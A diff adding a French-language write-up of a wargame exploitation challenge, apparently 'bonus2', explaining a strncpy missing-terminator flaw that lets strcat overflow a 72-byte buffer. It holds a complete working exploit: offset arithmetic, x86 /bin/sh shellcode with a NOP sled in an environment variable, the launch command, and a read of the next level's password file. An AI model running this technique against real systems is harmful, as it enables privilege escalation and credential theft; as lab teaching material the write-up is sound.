@@ -1,0 +1,60 @@
+Ce binaire peut être exploité par un buffer overflow.
+
+Son main ne fonctionne qu’avec 2 arguments (il vérifie argc == 3). Il crée deux buffers de 40 et 32 octets, puis y copie argv[1] et argv[2] avec strncpy.
+
+Il récupère aussi la variable d’environnement LANG et met à jour une variable globale selon sa valeur : 1 si LANG commence par “fi”, 2 si “nl”, 0 sinon.
+
+Ensuite il appelle greetuser en lui passant l’adresse du buffer où est stocké argv[1].
+
+Dans greetuser, un nouveau buffer de 72 octets est créé. Selon la valeur de la variable globale, un message de salutation est copié dans ce buffer (dans la langue correspondante). Puis greetuser appelle strcat pour ajouter le contenu de argv[1] à la suite du message, et affiche le tout avec puts.
+
+La faille : le premier strncpy copie 40 octets dans un buffer de 40 octets. Quand argv[1] fait exactement 40 caractères, strncpy ne place pas de \0 de fin. Comme les deux buffers de main sont collés en mémoire, il n’y a aucun \0 entre eux : ils fusionnent. Du coup, quand greetuser reçoit argv[1] et fait son strcat (qui copie jusqu’au premier \0), il copie en réalité le contenu des deux buffers (72 octets).
+
+Ces 72 octets, ajoutés à la longueur du message (13 octets en néerlandais), dépassent la taille du buffer de 72 octets de greetuser → débordement → on écrase l’adresse de retour de greetuser par l’adresse d’un shellcode placé dans une variable d’environnement.
+
+Calcul du décalage :
+
+distance début du buffer → adresse de retour de greetuser = 76 octets
+préfixe (message néerlandais) = 13 octets
+bourrage à fournir via les argv = 76 − 13 = 63 octets
+répartition : argv[1] = 40 octets (plein, pour la fusion) + argv[2] = 23 octets de bourrage + l’adresse du shellcode (4 octets)
+bash
+# 1. Définir la langue (message le plus pratique)
+export LANG=nl
+
+# 2. Exporter le shellcode dans une variable d'environnement
+export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+
+# 3. Créer et compiler un programme pour trouver l'adresse de la variable d'env
+cat > /tmp/getenv.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+    printf("%s is at %p\n", argv[1], getenv(argv[1]));
+}
+EOF
+gcc /tmp/getenv.c -o /tmp/getenv
+
+# 4. Récupérer l'adresse du shellcode
+/tmp/getenv SHELLCODE
+# → affiche par exemple : SHELLCODE is at 0xbffff8d2
+
+# 5. Lancer l'exploit (adresse en little-endian : 0xbffff8d2 → \xd2\xf8\xff\xbf)
+./bonus2 $(python -c "print 'A'*40") $(python -c "print 'A'*23 + '\xd2\xf8\xff\xbf'")
+
+# 6. Dans le shell obtenu
+cat /home/user/bonus3/.pass
+
+Notes :
+
+L’adresse est écrite à l’envers (little-endian) car le processeur x86 range les octets du poids faible au poids fort : 0xbffff8d2 → \xd2\xf8\xff\xbf.
+Le shellcode est dans une variable d’environnement (pas dans le buffer) car on n’a la place que pour l’adresse (4 octets) dans le payload. Le NOP sled (\x90*64) devant le shellcode donne une marge : il suffit que l’adresse tombe quelque part dans cette zone pour glisser jusqu’au shellcode.
+Le choix de LANG sert à allonger le préfixe du buffer : avec un message trop court, les 72 octets contrôlés n’atteindraient pas l’adresse de retour.
+
+*NOP sled (\x9064) : placé devant le shellcode dans la variable d’environnement, avec une adresse de retour qui vise cette zone.
+
+Un NOP est une instruction qui ne fait rien : le processeur la lit et passe à la suivante. En enchaîner 64 crée une « rampe ».
+Il est là parce que l’adresse exacte de la variable d’environnement n’est pas stable : elle dépend de la longueur du nom du programme et des autres variables d’env, et varie de quelques octets d’un lancement à l’autre.
+Sans le sled, le moindre décalage ferait segfault. Avec la rampe de 64 octets, il suffit que l’adresse tombe quelque part dedans : le CPU glisse de NOP en NOP jusqu’au shellcode, et l’exploit fonctionne malgré l’imprécision de l’adresse.
